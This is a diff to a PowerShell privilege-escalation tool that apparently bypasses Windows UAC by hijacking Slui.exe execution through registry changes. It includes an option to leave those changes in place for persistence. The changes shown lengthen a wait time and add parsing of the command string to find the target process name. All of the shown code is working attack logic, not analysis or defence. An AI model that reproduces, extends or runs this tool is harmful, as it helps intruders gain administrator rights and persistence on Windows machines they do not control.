@@ -135,7 +135,7 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
    Write-Host "[+] Hijacking => Slui.exe process execution."
    Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas
 
-   Start-Sleep -Milliseconds 3200 # Give time for Slui.exe to finish
+   Start-Sleep -Milliseconds 4000 # Give time for Slui.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
@@ -224,8 +224,21 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
       }
    }
    Else{
-      ## String: "powershell.exe"
-      $ProcessName = Split-Path "$Command" -Leaf
+      If($Command -notmatch '\\' -and $Command -notmatch ' '){
+         ## String: "powershell.exe"
+         $ProcessName = Split-Path "$Command" -Leaf
+      }ElseIF($Command -match '\\' -and $Command -notmatch ' '){
+         ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+         $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
+      }ElseIF($Command -match ' ' -and $Command -notmatch '\\'){
+         ## String: "powershell.exe Start-Process regedit.exe"
+         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
+      }ElseIF($Command -match '^[C:\\]' -and $Command -match ' '){
+         ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe"
+         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
+      }Else{
+         $ProcessName = Split-Path "$Command" -Leaf
+      }
       If($ProcessName -match '[.exe]$'){
          $ProcessToken = "$ProcessName"
          $ReturnCode = "4";$ProcessName = $ProcessName -replace '.exe',''
